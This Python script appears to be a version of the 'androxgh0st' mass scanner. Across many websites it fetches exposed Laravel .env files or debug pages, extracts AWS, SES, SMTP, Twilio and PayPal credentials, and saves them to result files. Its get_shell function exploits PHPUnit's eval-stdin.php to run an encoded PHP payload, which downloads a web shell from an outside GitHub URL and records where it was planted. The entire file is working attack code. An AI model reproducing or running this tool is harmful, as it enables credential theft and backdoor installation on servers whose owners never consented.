import requests
from re import findall as reg
from colorama import init
from multiprocessing import Pool
import urllib3

class GET_SMTP(object):

    def __init__(self, site, thread):
        self.site = site
        self.thread = thread

    init(convert=True)
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    
    def get_paypal(self, response, url):
        if 'PAYPAL_' in response:
            save = open('Results/paypal_sandbox.txt','a')
            save.write(url+'\n')
            save.close()
            return True
        else:
            return False

    def get_aws_region(self, response):
        list_region = '''us-east-1
        us-east-2
        us-west-1
        us-west-2
        af-south-1
        ap-east-1
        ap-south-1
        ap-northeast-1
        ap-northeast-2
        ap-northeast-3
        ap-southeast-1
        ap-southeast-2
        ca-central-1
        eu-central-1
        eu-west-1
        eu-west-2
        eu-west-3
        eu-south-1
        eu-north-1
        me-south-1
        sa-east-1'''
        reg = False
        for region in list_region.splitlines():
            if str(region) in response:
                return region
                break

    def get_aws_data(self, response, url):
        try:
            if "AWS_ACCESS_KEY_ID" in response:
                if "AWS_ACCESS_KEY_ID=" in response:
                    method = '/.env'
                    try:
                        aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", response)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", response)[0]
                    except:
                        aws_sec = ''
                    try:
                        get_region = self.get_aws_region(response)
                        if get_region:
                            aws_reg = get_region
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>AWS_ACCESS_KEY_ID</td>" in response:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", response)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", response)[0]
                    except:
                        aws_sec = ''
                        try:
                            get_region = self.get_aws_region(response)
                            if get_region:
                                aws_reg = get_region
                            else:
                                aws_reg = ''
                        except:
                            aws_reg = ''
                if aws_reg == '':
                    aws_reg = "aws_unknown_region--"
                if aws_key == '' and aws_sec == '':
                    return False
                else:
                    build = '{}|{}|{}|{}|{}'.format(str(url), str(method), str(aws_key), str(aws_sec), str(aws_reg))
                    remover = str(build).replace('\r', '')
                    save = open('Results/aws_access_key_secret.txt', 'a')
                    save.write(remover+'\n')
                    save.close()
                return True
            elif "AWS_KEY" in response:
                if "AWS_KEY=" in response:
                    method = '/.env'
                    try:
                        aws_key = reg("\nAWS_KEY=(.*?)\n", response)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nAWS_SECRET=(.*?)\n", response)[0]
                    except:
                        aws_sec = ''
                    try:
                        aws_reg = reg("\nAWS_REGION=(.*?)\n", response)[0]
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("\nAWS_BUCKET=(.*?)\n", response)[0]
                    except:
                        aws_buc = ''
                elif "<td>AWS_KEY</td>" in response:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", response)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", response)[0]
                    except:
                        aws_sec = ''
                    try:
                        aws_reg = reg("<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>", response)[0]
                    except:
                        aws_reg = ''
                    try:
                        aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", response)[0]
                    except:
                        aws_buc = ''
                if aws_reg == '':
                    aws_reg = "aws_unknown_region--"
                if aws_key == '' and aws_sec == '':
                    return False
                else:
                    build = '{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(aws_key), str(aws_sec), str(aws_reg), str(aws_buc))
                    remover = str(build).replace('\r', '')
                    save = open('Results/aws_access_key_secret.txt', 'a')
                    save.write(remover+'\n')
                    save.close()
                return True
            elif "SES_KEY" in response:
                if "SES_KEY=" in response:
                    method = '/.env'
                    try:
                        aws_key = reg("\nSES_KEY=(.*?)\n", response)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("\nSES_SECRET=(.*?)\n", response)[0]
                    except:
                        aws_sec = ''
                    try:
                        get_region = self.get_aws_region(response)
                        if get_region:
                            aws_reg = get_region
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                elif "<td>SES_KEY</td>" in response:
                    method = 'debug'
                    try:
                        aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", response)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", response)[0]
                    except:
                        aws_sec = ''
                    try:
                        get_region = self.get_aws_region(response)
                        if get_region:
                            aws_reg = get_region
                        else:
                            aws_reg = ''
                    except:
                        aws_reg = ''
                if aws_reg == '':
                    aws_reg = "aws_unknown_region--"
                if aws_key == '' and aws_sec == '':
                    return False
                else:
                    build = '{}|{}|{}|{}|{}'.format(str(url), str(method), str(aws_key), str(aws_sec), str(aws_reg))
                    remover = str(build).replace('\r', '')
                    save = open('Results/aws_access_key_secret.txt', 'a')
                    save.write(remover+'\n')
                    save.close()
                return True
            else:
                return False
        except:
            return False
    def get_shell(self, url):
        try:
            url = url + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
            data = "<?php phpinfo(); ?>"
            response = requests.get(url, data=data, timeout=15, verify=False).text
            if "phpinfo" in response:
                save = open('Results/vulnerable.txt', 'a')
                save.write(url+'\n')
                save.close()
                data2 = "<?php eval('?>'.base64_decode('PD9waHANCmZ1bmN0aW9uIGFkbWluZXIoJHVybCwgJGlzaSkgew0KCSRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7DQoJJGNoID0gY3VybF9pbml0KCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOw0KCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsNCgljdXJsX2Nsb3NlKCRjaCk7DQoJZmNsb3NlKCRmcCk7DQoJb2JfZmx1c2goKTsNCglmbHVzaCgpOw0KfQ0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h5b3Vlei9MaW51eFNlYy9tYXN0ZXIvYmF5LnBocCIsInNoM2xsLnBocCIpKSB7DQoJZWNobyAiU3Vrc2VzIjsNCn0gZWxzZSB7DQoJZWNobyAiZmFpbCI7DQp9DQo/Pg==')); ?>"
                spawn = requests.get(url, data=data2, timeout=15, verify=False).text
                if "Sukses" in spawn:
                    save = open('Results/shells.txt', 'a')
                    path = url.replace("eval-stdin.php","sh3ll.php")
                    save.write(path+'\n')
                    save.close()
                else:
                    return False
                return True
            else:
                return False
            return True
        except Exception:
            return False

    def get_twillio(self, response, url):
        try:
            if "TWILIO" in response:
                if "TWILIO_ACCOUNT_SID=" in response:
                    method = '/.env'
                    try:
                        acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', response)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', response)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = reg('\nTWILIO_API_SECRET=(.*?)\n', response)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', response)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg('\nTWILIO_NUMBER=(.*?)\n', response)[0]
                    except:
                        phone = ''
                    try:
                        authtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', response)[0]
                    except:
                        authtoken = ''
                elif '<td>TWILIO_ACCOUNT_SID</td>' in response:
                    method = 'debug'
                    try:
                        acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', response)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', response)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', response)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', response)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', response)[0]
                    except:
                        phone = ''
                    try:
                        authtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', response)[0]
                    except:
                        authtoken = ''
                build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(acc_sid), str(acc_key), str(sec), str(chatid) ,str(phone), str(authtoken))
                remover = str(build).replace('\r', '')
                save = open('Results/Twilio.txt', 'a')
                save.write(remover+'\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_smtp(self, response, url):
        try:
            if "MAIL_HOST" in response:
                if "MAIL_HOST=" in response:
                    method = '/.env'
                    mailhost = reg("\nMAIL_HOST=(.*?)\n", response)[0]
                    mailport = reg("\nMAIL_PORT=(.*?)\n", response)[0]
                    mailuser = reg("\nMAIL_USERNAME=(.*?)\n", response)[0]
                    mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", response)[0]
                    try:
                        mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", response)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("\MAIL_FROM_NAME=(.*?)\n", response)[0]
                    except:
                        fromname = ''
                elif "<td>MAIL_HOST</td>" in response:
                    method = 'debug'
                    mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', response)[0]
                    mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', response)[0]
                    mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', response)[0]
                    mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', response)[0]
                    try:
                        mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", response)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", response)[0]
                    except:
                        fromname = ''
                if mailuser == 'null' or mailpass == 'null' or mailuser == '' or mailpass == '':
                    return False
                else:
                    if '.amazonaws.com' in mailhost:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/smtp_aws.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    elif 'sendgrid' in mailhost:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/sendgrid.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    elif 'office365' in mailhost:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/office.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    elif '1and1' in mailhost:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/1and1.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    elif 'zoho' in mailhost:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/zoho.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    elif 'mandrillapp' in mailhost:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/mandrill.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    elif 'smtp2go' in mailhost:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/smtp2go.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    elif 'mailgun' in mailhost:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/mailgun.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    elif 'gmail' in mailhost:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/gmail.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    elif 'googlemail' in mailhost:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/gmail.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    elif 'mailtrap' in mailhost:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/mailtrap.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    else:
                        build = '{}|{}|{}|{}|{}|{}|{}|{}'.format(str(url), str(method), str(mailhost), str(mailport), str(mailuser), str(mailpass), str(mailfrom), str(fromname))
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\n')
                        save.close()
                    return True
            else:
                return False
        except:
            return False

    def get(self, url):
        resp = False
        try:
            text = '\033[32;1m#\033[0m '+url
            headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
            get_source = requests.get(url+"/.env", headers=headers, timeout=30, verify=False, allow_redirects=False).text
            if "APP_KEY=" in get_source:
                resp = get_source
            else:
                get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=30, verify=False, allow_redirects=False).text
                if "<td>APP_KEY</td>" in get_source:
                    resp = get_source
            if resp:
                getsmtp = self.get_smtp(resp, url)
                gettwilio = self.get_twillio(resp, url)
                getaws = self.get_aws_data(resp, url)
                getpp = self.get_paypal(resp, url)
                getshell = self.get_shell(url)
                if getsmtp:
                    text += ' | \033[32;1mSMTP\033[0m'
                else:
                    text += ' | \033[31;1mSMTP\033[0m'
                if gettwilio:
                    text += ' | \033[32;1mTWILIO\033[0m'
                else:
                    text += ' | \033[31;1mTWILIO\033[0m'
                if getaws:
                    text += ' | \033[32;1mAWS\033[0m'
                else:
                    text += ' | \033[31;1mAWS\033[0m'
                if getpp:
                    text += ' | \033[32;1mPAYPAL\033[0m'
                else:
                    text += ' | \033[31;1mPAYPAL\033[0m'
                if getshell:
                    text += ' | \033[32;1mSHELL\033[0m'
                else:
                    text += ' | \033[31;1mSHELL\033[0m'
            else:
                text += ' | \033[31;1mCan\'t get everything\033[0m'
                remover = str(url).replace('\r', '')
                save = open('Results/not_vulnerable.txt', 'a')
                save.write(remover+'\n')
                save.close()
        except:
            text = '\033[31;1m#\033[0m '+url
            text += ' | \033[31;1mCan\'t access sites\033[0m'
            remover = str(url).replace('\r', '')
            save = open('Results/not_vulnerable.txt', 'a')
            save.write(remover+'\n')
            save.close()
        print(text)

    def run(self):
        with Pool(self.thread) as worker:
            worker.map(self.get, self.site)
            worker.close()
            worker.join()
